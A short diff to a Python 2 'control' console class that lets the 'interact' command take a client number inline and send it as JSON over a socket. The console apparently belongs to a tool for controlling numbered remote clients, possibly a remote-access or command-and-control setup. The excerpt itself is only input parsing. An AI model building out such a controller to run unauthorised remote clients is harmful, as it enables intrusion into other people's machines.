@@ -116,9 +116,13 @@ class control():
 						os.system("clear")
 				elif(command == "help"):
 					print commands
-				elif(command == "interact"): 
-					client = raw_input(" [#] Client Number:")
-					Cmd = {"command": command, "client":client}
+				elif("interact" in command):
+					answers = command.split(' ')
+					if len(answers) == 1:
+						client = raw_input(" [#] Client Number:")
+						Cmd = {"command": command, "client":client}
+					else:
+						Cmd = {"command": answers[0], "client":answers[1]} 
 					Cmd = json.dumps(Cmd)
 					s.send(Cmd)
 					reply = s.recv(20480)
